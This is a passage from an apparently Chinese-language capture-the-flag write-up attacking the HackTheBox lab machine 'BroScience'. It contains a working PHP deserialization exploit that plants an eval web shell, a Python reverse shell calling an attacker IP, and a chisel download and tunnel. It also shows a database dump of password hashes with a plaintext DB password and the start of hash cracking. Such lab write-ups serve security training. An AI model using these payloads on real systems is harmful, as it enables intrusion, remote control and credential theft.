class="variable">$from</span> &gt; <span class="variable">$to</span>) ? (<span class="string">&quot;from now&quot;</span>) : (<span class="string">&quot;ago&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$unitCount</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$units</span> <span class="keyword">as</span> <span class="variable">$unit</span> =&gt; <span class="variable">$mult</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$diff</span> &gt;= <span class="variable">$mult</span> &amp;&amp; <span class="variable">$unitCount</span> &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="variable">$unitCount</span> += <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// $and = (($mult != 1) ? (&quot;&quot;) : (&quot;and &quot;));</span></span><br><span class="line">            <span class="variable">$and</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$output</span> .= <span class="string">&quot;, &quot;</span>.<span class="variable">$and</span>.intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>).<span class="string">&quot; &quot;</span>.<span class="variable">$unit</span>.((intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) == <span class="number">1</span>) ? (<span class="string">&quot;&quot;</span>) : (<span class="string">&quot;s&quot;</span>));</span><br><span class="line">            <span class="variable">$diff</span> -= intval(<span class="variable">$diff</span> / <span class="variable">$mult</span>) * <span class="variable">$mult</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$output</span> .= <span class="string">&quot; &quot;</span>.<span class="variable">$suffix</span>;</span><br><span class="line">    <span class="variable">$output</span> = substr(<span class="variable">$output</span>, strlen(<span class="string">&quot;, &quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = base64_encode(serialize(<span class="keyword">new</span> UserPrefs()));</span><br><span class="line">            setcookie(<span class="string">&#x27;user-prefs&#x27;</span>, <span class="variable">$up_cookie</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$up_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user-prefs&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$up</span>-&gt;theme;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;light&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme_class</span>(<span class="params"><span class="variable">$theme</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$theme</span>)) &#123;</span><br><span class="line">        <span class="variable">$theme</span> = get_theme();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (strcmp(<span class="variable">$theme</span>, <span class="string">&quot;light&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-light&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;uk-dark&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_theme</span>(<span class="params"><span class="variable">$val</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;user-prefs&#x27;</span>,base64_encode(serialize(<span class="keyword">new</span> UserPrefs(<span class="variable">$val</span>))));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">        fclose(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line">        <span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户激活码生成来自于种子为<code>time()</code>的随机序列</p><p>编写以下Python脚本以自动注册并枚举时间以激活</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line">register_url = <span class="string">&quot;https://broscience.htb/register.php&quot;</span></span><br><span class="line">register_data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;bfl2&quot;</span>, <span class="string">&quot;email&quot;</span>: <span class="string">&quot;bfl2@bfl.bfl&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;bfl&quot;</span>, <span class="string">&quot;password-confirm&quot;</span>: <span class="string">&quot;bfl&quot;</span>&#125;</span><br><span class="line">activate_url = <span class="string">&quot;https://broscience.htb/activate.php?code=%s&quot;</span></span><br><span class="line"></span><br><span class="line">res = req.get(url = register_url, verify = <span class="literal">False</span>)</span><br><span class="line">start_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">start_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % start_time_str, shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = req.post(url = register_url, data = register_data, verify = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;created&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(<span class="string">&quot;Created.&quot;</span>)</span><br><span class="line">end_time_str = res.headers[<span class="string">&quot;Date&quot;</span>]</span><br><span class="line">end_time = subprocess.Popen(<span class="string">&quot;php -r &#x27;echo strtotime(\&quot;%s\&quot;);&#x27;&quot;</span> % end_time_str, shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">start_time = <span class="built_in">int</span>(start_time)</span><br><span class="line">end_time = <span class="built_in">int</span>(end_time)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(start_time, end_time + <span class="number">1</span>):</span><br><span class="line">code = subprocess.Popen(<span class="string">&quot;php -r &#x27;include \&quot;code.php\&quot;; echo generate_activation_code(%s);&#x27;&quot;</span> % <span class="built_in">str</span>(_), shell = <span class="literal">True</span>, stdout = subprocess.PIPE).communicate()[<span class="number">0</span>].decode()</span><br><span class="line">print(code)</span><br><span class="line">res = req.get(url = activate_url % code)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Invalid&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">print(<span class="string">&quot;Activated.&quot;</span>)</span><br><span class="line">print(register_data)</span><br></pre></td></tr></table></figure><p><code>code.php</code>如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># code.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate_activation_code</span>(<span class="params"><span class="variable">$time</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;</span>;</span><br><span class="line">srand(<span class="variable">$time</span>);</span><br><span class="line"><span class="variable">$activation_code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">32</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="variable">$activation_code</span> = <span class="variable">$activation_code</span> . <span class="variable">$chars</span>[rand(<span class="number">0</span>, strlen(<span class="variable">$chars</span>) - <span class="number">1</span>)];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$activation_code</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>登陆后主页发现一个切换主题按钮，查看其代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;https://broscience.htb/includes/img.php?path=..%252f/swap_theme.php&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># payload.php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if user is logged in already</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: /index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Swap the theme</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;includes/utils.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;dark&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    set_theme(<span class="string">&quot;light&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Redirect</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">&#123;$_SERVER[&#x27;HTTP_REFERER&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: /index.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合<code>utils.php</code>，即可分析出如下反序列化漏洞利用过程</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strcmp(get_theme(), <span class="string">&quot;light&quot;</span>) === <span class="number">0</span>) -&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_theme</span>(<span class="params"></span>) -&gt;</span></span><br><span class="line">$up_cookie = $_COOKIE[&#x27;user-prefs&#x27;]; -&gt;</span><br><span class="line"><span class="variable">$up</span> = unserialize(base64_decode(<span class="variable">$up_cookie</span>)); -&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> -&gt;</span></span><br><span class="line">public function __wakeup() -&gt; </span><br><span class="line">fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br></pre></td></tr></table></figure><p>在<code>$up = unserialize(base64_decode($up_cookie));</code>这步过程中，序列化结果加入一个<code>AvatarInterface</code>对象，反序列化构造这个<code>AvatarInterface</code>对象时会调用<code>__wakeup()</code></p><p>编写<code>payload.php</code>如下，使用<code>php://input</code>和POST数据配合进行内容写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Avatar</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$imgPath</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$imgPath</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;imgPath = <span class="variable">$imgPath</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$tmp</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$f</span> = fopen(<span class="keyword">$this</span>-&gt;imgPath, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">fwrite(<span class="variable">$f</span>, file_get_contents(<span class="variable">$tmp</span>));</span><br><span class="line">fclose(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AvatarInterface</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$tmp</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$imgPath</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Avatar(<span class="keyword">$this</span>-&gt;imgPath);</span><br><span class="line"><span class="variable">$a</span>-&gt;save(<span class="keyword">$this</span>-&gt;tmp);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserPrefs</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$theme</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$theme</span> = <span class="string">&quot;light&quot;</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;theme = <span class="variable">$theme</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">payload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$BFL</span> = <span class="keyword">new</span> UserPrefs();</span><br><span class="line"><span class="variable">$BFL</span>-&gt;theme = <span class="keyword">new</span> AvatarInterface();</span><br><span class="line"><span class="variable">$BFL</span>-&gt;theme-&gt;imgPath = <span class="string">&quot;/var/www/html/BFL.php&quot;</span>;</span><br><span class="line"><span class="variable">$BFL</span>-&gt;theme-&gt;tmp = <span class="string">&quot;php://input&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$BFL</span>));</span><br><span class="line">&#125;</span><br><span class="line">payload();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成Payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -f payload.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0&#x3D;</span><br></pre></td></tr></table></figure><p><code>PHPSESSID</code>为登陆后服务器给的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/swap_theme.php -H <span class="string">&quot;Cookie: PHPSESSID=5l9ql8diuiej262srrp4chu47e; user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO086MTU6IkF2YXRhckludGVyZmFjZSI6Mjp7czozOiJ0bXAiO3M6MTE6InBocDovL2lucHV0IjtzOjc6ImltZ1BhdGgiO3M6MjE6Ii92YXIvd3d3L2h0bWwvQkZMLnBocCI7fX0=&quot;</span> -d <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><p>即可在<code>/var/www/html/BFL.php</code>写入内容<code>&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;</code></p><p>构造反弹Shell语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9998));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span></span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>进行反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://broscience.htb/BFL.php -d <span class="string">&#x27;BFL=system(base64_decode(&quot;BASE64_ENCODED_PAYLOAD&quot;));&#x27;</span> --insecure</span><br></pre></td></tr></table></figure><p>获取Shell之后获取tty并查看端口监听信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure><p>确认5432端口有服务在运行中</p><p>使用chisel进行端口转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./chisel_1.8.1_linux_amd64 server -p 9997 --reverse &amp;</span><br><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget 10.10.16.3/chisel_1.8.1_linux_amd64</span><br><span class="line">chmod +x chisel_1.8.1_linux_amd64</span><br><span class="line">./chisel_1.8.1_linux_amd64 client 10.10.16.3:9997 R:9996:127.0.0.1:5432</span><br></pre></td></tr></table></figure><p>在本机上连接postgresql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psql -h 0.0.0.0 -p 9996 -U dbuser -d broscience -W</span><br><span class="line">RangeOfMotion%777</span><br></pre></td></tr></table></figure><p>查看数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\l</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                  List of databases</span><br><span class="line">    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   </span><br><span class="line">------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------</span><br><span class="line"> broscience | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | </span><br><span class="line"> template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line"> template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | &#x3D;c&#x2F;postgres          +</span><br><span class="line">            |          |          |             |             |            |                 | postgres&#x3D;CTc&#x2F;postgres</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看数据库<code>broscience</code>中的表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\c broscience</span><br><span class="line">RangeOfMotion%777</span><br><span class="line">\dt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">           List of relations</span><br><span class="line"> Schema |   Name    | Type  |  Owner   </span><br><span class="line">--------+-----------+-------+----------</span><br><span class="line"> public | comments  | table | postgres</span><br><span class="line"> public | exercises | table | postgres</span><br><span class="line"> public | users     | table | postgres</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure><p>查看users表中数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> id |   username    |             password             |            email             |         activation_code          | is_activated | is_admin |         date_created          </span><br><span class="line">----+---------------+----------------------------------+------------------------------+----------------------------------+--------------+----------+-------------------------------</span><br><span class="line">  1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t            | t        | 2019-03-07 02:02:22.226763-05</span><br><span class="line">  2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb          | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t            | f        | 2019-05-07 03:34:44.127644-04</span><br><span class="line">  3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb       | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t            | f        | 2020-10-01 04:12:34.732872-04</span><br><span class="line">  4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb          | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t            | f        | 2021-09-21 11:45:53.118482-04</span><br><span class="line">  5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb        | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t            | f        | 2021-08-13 10:34:36.226763-04</span><br><span class="line">(5 rows)</span><br></pre></td></tr></table></figure><p>构造Hash如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">15657792073e8a843d4f91fc403454e1:NaCl</span><br><span class="line">13edad4932da9dbb57d9cd15b66ed104:NaCl</span><br><span class="line">bd3dad50e2d578ecba87d5fa15ca5f85:NaCl</span><br><span class="line">a7eed23a7be6fe0d765197b1027453fe:NaCl</span><br><span class="line">5d15340bded5b9395d5d14b9c21bc82b:NaCl</span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 20 <span class="built_in">hash</span> 